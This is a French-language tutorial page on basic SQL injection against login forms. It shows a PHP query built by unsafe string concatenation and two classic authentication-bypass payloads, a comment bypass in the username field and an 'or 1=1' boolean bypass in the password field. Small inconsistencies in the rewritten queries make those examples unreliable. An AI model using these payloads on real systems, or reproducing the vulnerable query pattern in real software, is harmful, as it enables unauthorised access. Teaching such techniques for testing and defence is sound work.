---
description: >-
  Ces opérations sont à utiliser en premier recours, pour vérifier si le système
  n'est pas totalement désuet de toute sécurité.
---

# Injections basiques

#### 1. Par le nom d'utilisateur

Dans un premier temps, on peut s'attaquer au _**nom d'utilisateur**_. Prenons par exemple, une requête de connexion au serveur de ce type :

```sql
select * from user_table
where username = 'anto'
and password = 'mystrongpassword';
```

En supposant que le mot de passe ne soit pas haché, la requête PHP ressemblerait à ceci :

```php
// Connexion à la database
$db_query = "select * from user_table where
username = '".$user."'
AND password = '".$password."';";
// Execution de la requête
```

Ainsi, en entrant dans la section du nom d'utilisateur « **anto’;--** » la requête SQL devient :

```sql
select * from user_table where
username = 'anto';-- and password = 'mystrongpassword'
```

Or, le double tiret permet de commenter du code en SQL, ce qui revient donc à contourner le mot de passe, et à pouvoir se connecter en ayant uniquement besoin du nom d'utilisateur.



#### 2. Par le mot de passe, par attaque booléenne 

Une deuxième possibilité à tester, est l'injection SQL booléenne. Par exemple, en ayant une requête SQL de ce type :

```sql
select * from user_table where
username = 'anto' and
password = 'password';
```

On peut très bien contourner le mot de passe, en entrant dans la section du mot de passe la commande « **'or 1=1;--'** » qui transforme la requête comme ceci :

```sql
select * from user_table where
username = 'anto' and
password = 'password' or 1=1;--';
```

Et qui de ce fait, rend totalement inutile la condition password='anto' vu que la condition 1=1 sera toujours vraie.

{% hint style="warning" %}
Malheureusement pour nous, ces genres de vulnérabilités sont extrêmement rares, mais valent le coup d'être essayés.
{% endhint %}

